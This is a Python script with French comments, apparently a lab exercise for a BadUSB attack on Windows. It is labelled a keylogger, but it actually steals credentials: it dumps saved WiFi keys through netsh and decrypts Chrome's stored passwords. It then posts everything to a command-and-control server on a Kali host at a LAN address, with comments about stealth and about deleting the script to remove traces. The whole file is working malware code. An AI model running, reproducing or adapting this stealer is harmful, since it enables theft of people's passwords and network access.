# How-To: Script keylogger pour attaque USB sur Windows
# Exécuter manuellement ou via simulation BadUSB
# Exfiltre vers C2 sur Kali (192.168.2.154:8080)
# Matricules: [INSÉRER TES MATRICULES ICI]

import subprocess
import sqlite3
import os
import requests
import win32crypt  # Nécessite pywin32

# Étape 1: Extraire identifiants WiFi
def get_wifi_creds():
    try:
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
        wifi_data = {}
        for line in profiles.split('\n'):
            if "All User Profile" in line:
                profile_name = line.split(':')[1].strip()
                details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear']).decode('utf-8', errors='ignore')
                for detail in details.split('\n'):
                    if "Key Content" in detail:
                        wifi_data[profile_name] = detail.split(':')[1].strip()
        return wifi_data
    except Exception as e:
        return {"error": str(e)}

# Étape 2: Extraire identifiants Chrome
def get_browser_creds():
    try:
        chrome_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
        if not os.path.exists(chrome_db):
            return [{"error": "Chrome DB not found"}]
        conn = sqlite3.connect(chrome_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credentials = []
        for row in cursor.fetchall():
            url, username, encrypted_pass = row
            try:
                password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                credentials.append({"url": url, "username": username, "password": password})
            except:
                continue
        conn.close()
        return credentials
    except Exception as e:
        return [{"error": str(e)}]

# Étape 3: Envoyer à C2
def send_to_c2(data):
    c2_url = "http://192.168.2.154:8080"  # IP de Kali
    try:
        response = requests.post(c2_url, json=data, timeout=5)
        if response.status_code == 200:
            print("Exfil OK")  # Pour debug, retire pour furtivité
    except Exception as e:
        print(f"Erreur exfil: {e}")  # Pour debug

# Main
if __name__ == "__main__":
    wifi_data = get_wifi_creds()
    browser_data = get_browser_creds()
    payload = {"wifi": wifi_data, "browser": browser_data, "matricules": "[TES_MATRICULES]", "victim_ip": "192.168.2.155"}
    send_to_c2(payload)
    # Optionnel: Supprimer traces
    # os.remove(__file__)
